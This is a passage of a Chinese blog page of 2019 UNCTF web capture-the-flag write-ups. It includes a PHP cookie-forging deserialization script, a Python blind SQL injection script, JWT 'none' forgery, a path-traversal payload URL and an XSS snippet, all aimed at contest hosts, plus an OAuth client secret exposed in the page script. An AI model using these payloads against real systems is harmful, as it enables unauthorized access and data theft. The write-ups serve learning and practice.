class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $funny = <span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=(<span class="keyword">new</span> debug());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> session();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$key = base64_encode($str);</span><br><span class="line">	$key = bin2hex($key);</span><br><span class="line">	$arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">	$cipher = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">		$num = hexdec($value);</span><br><span class="line">		$num = $num + <span class="number">240</span>;</span><br><span class="line">		$cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_decode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$data = urldecode($str);</span><br><span class="line">	$data = substr($data, <span class="number">1</span>);</span><br><span class="line">	$arr = explode(<span class="string">'&amp;'</span>, $data);</span><br><span class="line">	$cipher = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">		$num = hexdec($value);</span><br><span class="line">		$num = $num - <span class="number">240</span>;</span><br><span class="line">		$cipher = $cipher.<span class="string">'%'</span>.dechex($num);</span><br><span class="line">	&#125;</span><br><span class="line">	$key = urldecode($cipher);</span><br><span class="line">	$key = base64_decode($key);</span><br><span class="line">	<span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cookie = <span class="string">"%26144%2616a%2615f%26123%2613f%26159%2613a%2616a%2614a%26148%2613e%2616a%26151%26147%26129%26165%26139%2615a%2615f%2616a%2613f%2615e%26164%2616a%2613f%2615a%26149%26126%26139%2615d%2613e%2615f%26152%26122%26129%2616a%2614a%26143%26139%26127%26151%26144%2615f%26168%2613f%26123%2613d%26126%2613d%2615a%2615f%26159%26151%26147%26141%26159%2613f%26122%2615b%26126%2613d%26144%26164%2616a%2613f%2615a%26157%26126%26139%2615e%26146%2616a%2614a%26148%2613a%26165%26149%26147%26121%2615c%26139%2615a%26164%2616a%2613f%2615a%26153%26126%26139%2615e%26146%26165%26149%26147%26142%26164%26151%26147%26124%26159%2613f%26123%26120%2612d"</span>;</span><br><span class="line"><span class="keyword">echo</span> cookie_decode($cookie);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="./1572152358591.png" alt="1572152358591"></p>
+<h1 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h1><ol>
+<li><p>重置密码处盲注: ‘ || ascii(substr(password),{i},1))={j}#,得到密码一半的flag，利用密码登录</p>
+<p><code>flag{never_too</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://101.71.29.5:10045/index.php?file=forget"</span></span><br><span class="line">str1 = string.printable</span><br><span class="line">result=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">f"' || ascii(substr(password,<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;ord(j)&#125;</span>#"</span></span><br><span class="line">        &#125;</span><br><span class="line">        rep = requests.post(url,data=data)</span><br><span class="line">        print(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"ok"</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">            result+=j</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ol>
+<ol start="2">
+<li>在修改referer头为127.0.0.1 得到另一半flag</li>
+</ol>
+<p>flag: never_too_late_to_x</p>
+<h1 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h1><ol>
+<li>先给osword发送重置密码邮件，</li>
+<li>使用收到的验证码，进入到重置密码界面</li>
+<li>再发送给admin重置密码，session更改username为admin</li>
+<li>接着修改密码zxasqw159</li>
+<li>登录admin zxasqw159即可得到flag</li>
+</ol>
+<p><img src="./1572000991468.png" alt="1572000991468"></p>
+<h1 id="加密的备忘录"><a href="#加密的备忘录" class="headerlink" title="加密的备忘录"></a>加密的备忘录</h1><p>比简单备忘录多加了个<code>unicode</code>混淆</p>
+<p><strong>/graphql</strong>提供了graphql查询，查下结构，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Query类多出checkPass方法，查询Memo_接口password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231</span><br><span class="line">要有了产于了主方以定人方于有成以他的爱爱</span><br></pre></td></tr></table></figure>
+
+<p>用checkPass，输入password:1 回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;\u4e3a\u6211\u7231\u7231&quot; not valid password</span><br><span class="line">为我爱爱</span><br></pre></td></tr></table></figure>
+
+<p>思路：输入字符与原密文比较得到明文</p>
+<ol>
+<li>爆破第一位，checkPass函数传入的参数password：[0-9a-zA-Z]，观察结果中带有密文password的第一个unicode编码：<strong>\u8981</strong>，发现[H-K]都满足</li>
+<li>第一位设置区间为[H-K]，第二位设置区间[0-9a-zA-Z]，只要得到unicode编码为：<strong>\u8981\u6709</strong>，即为对应的明文。发现当第一位为<strong>H</strong>，第二位为<strong>[a-o]</strong>时，都可以得到<code>\u8981\u6709。</code>确定第一位明文为<strong>H</strong>，接着在对第二位进行爆破</li>
+<li>第二位设置区间[a-o]，第三位设置区间[0-9a-zA-Z]</li>
+</ol>
+<p>不会写脚本直接手lu,得到password：<strong>HappY4Gr4phQL</strong></p>
+<h1 id="Arbi"><a href="#Arbi" class="headerlink" title="Arbi"></a>Arbi</h1><p>登录注册界面</p>
+<p><img src="./1573556772013.png" alt="1573556772013"></p>
+<p>登录之后，服务端本地开启9000端口读取本地文件，路径依据注册的账号，可以便利目录读文件</p>
+<p><img src="./1573556758357.png" alt="1573556758357"></p>
+<p>Express框架，读取<strong><a href="http://127.0.0.1:9000/upload/../package.json?.jpg" target="_blank" rel="noopener">http://127.0.0.1:9000/upload/../package.json?.jpg</a></strong></p>
+<p><img src="./1573556592148.png" alt="1573556592148"></p>
+<p>后端使用jwt构造身份验证</p>
+<p><img src="./1573565534827.png" alt="1573565534827"></p>
+<ol>
+<li>利用express当传入algorithm为none，会使用algorithm none解密</li>
+<li><code>var secret = global.secretlist[id];</code> 传入不存在的id，使得secret为undefined</li>
+</ol>
+<p><img src="./1573565835641.png" alt="1573565835641"></p>
+<p>在login界面增加伪造token，并登录,进入admin后台，session.name=’admin’，就能够访问admin23333_interface.js</p>
+<p><img src="./1573566009065.png" alt="1573566009065"></p>
+<p><img src="./1573565975973.png" alt="1573565975973"></p>
+<p>admin23333_interface.js有个文件读取接口,参数可控</p>
+<p><img src="./1573566045820.png" alt="1573566045820"></p>
+<p>用到两个trick:</p>
+<ol>
+<li>传入a[b]=1 会转为a={“b”:1}构造为对象，正则匹配无法识别对象，爆warnnig绕过第一个if</li>
+<li>length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环 即可完美绕过过滤 而express  中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&amp;a=456 解析后 a = [123,456]，所以最终组合成</li>
+</ol>
+<p><img src="./1573562632890.png" alt="1573562632890"></p>
+<p>payload:<code>&lt;http://183.129.189.60:10047/admin23333_interface?name[filename]=../&amp;name[filename]=f&amp;name[filename]=l&amp;name[filename]=a&amp;name[filename]=g&gt;</code></p>
+<p><img src="./1573566304858.png" alt="1573566304858"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">'123'</span> onerror=<span class="string">'alert(1)'</span> &gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="./1573567727736.png" alt="1573567727736"></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/10/17/ATS%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <span class="nav-arrow">← </span>
+        
+          ATS反向代理环境搭建
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/11/03/2019%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/">
+        
+          2019上海大学生网络安全竞赛web题解
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Twice-Insert"><span class="toc-nav-text">Twice_Insert</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#简单的备忘录"><span class="toc-nav-text">简单的备忘录</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#checkin"><span class="toc-nav-text">checkin</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#审计一下世界上最好的语言吧"><span class="toc-nav-text">审计一下世界上最好的语言吧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#payload"><span class="toc-nav-text">payload</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#bypass"><span class="toc-nav-text">bypass</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#payload-1"><span class="toc-nav-text">payload</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#题目修改后"><span class="toc-nav-text">题目修改后</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#easy-pentest"><span class="toc-nav-text">easy_pentest</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#getshell思路"><span class="toc-nav-text">getshell思路</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#k-amp-k"><span class="toc-nav-text">k&amp;k</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#分析"><span class="toc-nav-text">分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#exp"><span class="toc-nav-text">exp</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#easy-admin"><span class="toc-nav-text">easy_admin</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#NSB-Reset-Password"><span class="toc-nav-text">NSB Reset Password</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#加密的备忘录"><span class="toc-nav-text">加密的备忘录</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Arbi"><span class="toc-nav-text">Arbi</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/11/02/2019UNCTF已解决WEB题解/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "2019UNCTF WEB题解",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
